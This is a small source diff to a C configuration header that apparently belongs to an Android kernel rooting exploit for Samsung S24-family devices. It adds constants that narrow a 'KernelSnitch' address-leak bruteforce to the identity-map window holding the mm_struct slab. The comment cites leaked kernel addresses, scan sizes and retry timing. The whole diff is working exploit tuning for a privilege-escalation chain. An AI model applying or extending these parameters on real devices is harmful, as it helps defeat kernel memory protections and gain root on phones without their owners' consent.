@@ -18,6 +18,22 @@
  */
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_P0_REFRESH_ORACLE_EACH_FRESH_PAGE 1
+/*
+ * Narrow the stage-2 (prepare_kernel_page) KernelSnitch bruteforce to the
+ * identity window that actually contains the e1q mm_struct slab, mirroring the
+ * validated S24-family profiles (e1s/e2s: APP_KERNEL_PAGE_KSNITCH_IDENTITY_END
+ * 0xffffff8080000000).  e1q on-device leaks land in 0xffffff80..0xffffff88
+ * (e.g. 0xffffff8834962000, 0xffffff8870c000), so the end is set above that
+ * (0xffffff8900000000 = 36GB from IDENTITY_START) instead of the e1s 2GB value.
+ * Without this, every stage-2 leak scans the full 64GB identity
+ * (candidates=8388608/thread, ~5s), and the app's 45s p0 timeout only allows
+ * ~3 retries before SIGKILL 137.  Narrowing to 36GB cuts each leak to ~1.8x
+ * faster with EXACT_PARTITION slab alignment so all 8 setup retries fit.
+ * The clamped object index (see util.c) keeps the scan within the 4K mm slab
+ * object count (objects_per_slab=4 for MM_SLAB_ORDER=0/0x3c0).
+ */
+#define APP_KERNEL_PAGE_KSNITCH_IDENTITY_END 0xffffff8900000000ULL
+#define APP_KERNEL_PAGE_KSNITCH_EXACT_PARTITION 1
 #else
 #define BUILD_VARIANT_LABEL "e1q-S9210ZHS6DZF2-root-umh"
 #endif
